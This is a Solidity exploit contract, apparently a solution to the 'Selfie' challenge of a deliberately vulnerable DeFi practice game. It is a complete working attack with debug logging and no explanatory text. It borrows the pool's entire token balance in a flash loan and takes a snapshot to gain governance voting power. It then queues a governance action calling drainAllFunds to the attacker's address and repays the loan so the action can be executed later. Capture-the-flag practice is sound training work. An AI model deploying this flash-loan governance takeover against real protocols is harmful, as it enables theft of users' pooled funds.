// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";


interface Snapshoter{
	function snapshot() external returns (uint256);
}

contract SelfieExploit {
	using Address for address;

	SelfiePool public selfiePool;
	SimpleGovernance public governance;
	address public attackerEOA;
	uint256 public actionId;
	
	
    constructor(address selfiePoolAddress, address governanceAddress) {
        selfiePool = SelfiePool(selfiePoolAddress);
		governance = SimpleGovernance(governanceAddress);
		attackerEOA = msg.sender;
    }
    
	function setupAttack() external {
		uint256 amount = selfiePool.token().balanceOf(address(selfiePool));
		console.log("pool balance: ", amount);
		Snapshoter(selfiePool.token()).snapshot();
		selfiePool.flashLoan(amount);
	}
	function receiveTokens(address token, uint256 amount) external {
	//address receiver, bytes calldata data, uint256 weiAmount
		console.log("#1 actionId = ", actionId);
		actionId = governance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", attackerEOA), 0);
		console.log("#2 actionId = ", actionId);
		IERC20(token).transfer(address(selfiePool), amount);
	}
	
	function attack() external {
		console.log("attack actionId:: ",actionId);
		governance.executeAction(actionId);
	}
}



/**

 ISelfie:: drainAllFunds(address receiver) external onlyGovernance
 

**/
